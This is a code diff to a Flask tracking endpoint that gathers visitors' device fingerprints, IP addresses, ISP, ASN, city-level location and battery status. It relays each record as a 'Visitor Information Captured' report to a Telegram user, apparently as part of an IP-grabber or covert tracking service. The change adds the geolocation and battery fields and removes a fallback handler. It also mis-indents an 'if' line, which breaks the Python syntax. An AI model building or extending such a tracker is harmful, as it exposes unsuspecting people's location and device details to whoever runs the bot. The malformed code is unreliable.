@@ -184,57 +184,67 @@ def track():
         return jsonify({"ok": True}), 200
 
     # ── DEVICE INFO ──
-    if typ == "device_info" and isinstance(payload, dict):
+        if typ == "device_info" and isinstance(payload, dict):
         ua = payload.get("ua", "n/a")
         platform = payload.get("platform", "n/a")
         lang = payload.get("lang", "n/a")
-        screen = payload.get("screen", "n/a")
+        langs = payload.get("langs", "n/a")
+        screen_res = payload.get("screen", "n/a")
+        avail = payload.get("avail", "n/a")
+        color_depth = payload.get("colorDepth", "n/a")
         tz = payload.get("tz", "n/a")
-        url = payload.get("url", "n/a")
         cores = payload.get("cores", "n/a")
         mem = payload.get("mem", "n/a")
-        color_depth = payload.get("colorDepth", "n/a")
         touch = payload.get("touch", "n/a")
         touch_points = payload.get("touchPoints", "n/a")
         cookies = payload.get("cookies", "n/a")
         dnt = payload.get("dnt", "n/a")
+        url = payload.get("url", "n/a")
+
+        ip = payload.get("ip", "?")
+        country = payload.get("country", "?")
+        cc = payload.get("countryCode", "")
+        region = payload.get("region", "?")
+        city = payload.get("city", "?")
+        isp = payload.get("isp", "?")
+        asn = payload.get("asn", "?")
+        bat_level = payload.get("batteryLevel", "n/a")
+        bat_charge = payload.get("batteryCharging", "n/a")
 
         text = (
             f"📊 <b>Visitor Information Captured</b>\n"
-            f"{DIVIDER}\n"
+            f"{DIVIDER}\n\n"
             f"🖥️ <b>Device &amp; Browser</b>\n"
             f"   • Device Model: {platform}\n"
             f"   • User Agent: {ua}\n\n"
             f"🌐 <b>Network Information</b>\n"
-            f"   • Language: {lang}\n\n"
+            f"   • IP Address: {ip}\n"
+            f"   • Language: {lang} ({langs})\n"
+            f"   • ISP: {isp}\n"
+            f"   • ASN: {asn}\n\n"
+            f"📍 <b>Location Details</b>\n"
+            f"   • Country: {country} {_flag_emoji(cc)}\n"
+            f"   • Region: {region}\n"
+            f"   • City: {city}\n"
+            f"   • Timezone: {tz}\n\n"
             f"🖼️ <b>Display Information</b>\n"
-            f"   • Resolution: {screen}\n"
+            f"   • Resolution: {screen_res} (avail {avail})\n"
             f"   • Color Depth: {color_depth}\n"
             f"   • Touch: {touch} ({touch_points})\n\n"
+            f"🔋 <b>Battery Status</b>\n"
+            f"   • Level: {bat_level}\n"
+            f"   • Charging: {bat_charge}\n\n"
             f"💾 <b>Hardware &amp; Storage</b>\n"
             f"   • CPU Cores: {cores}\n"
             f"   • RAM: {mem} GB\n\n"
             f"⚙️ <b>Other</b>\n"
-            f"   • Timezone: {tz}\n"
             f"   • Cookies: {cookies}\n"
             f"   • DNT: {dnt}\n"
             f"   • Page URL: {url}\n\n"
-            f"{DIVIDER}\n"
-            f"{FOOTER}"
+            f"{DIVIDER}\n{FOOTER}"
         )
         _send_telegram_text(uid, text)
         return jsonify({"ok": True}), 200
-
-    # ── FALLBACK ──
-    text = (
-        f"📡 <b>{typ}</b>\n"
-        f"{DIVIDER}\n"
-        f"<code>{json.dumps(payload)[:900]}</code>\n"
-        f"{DIVIDER}\n"
-        f"{FOOTER}"
-    )
-    _send_telegram_text(uid, text)
-    return jsonify({"ok": True}), 200
 
 @app.route("/health", methods=["GET"])
 def health():
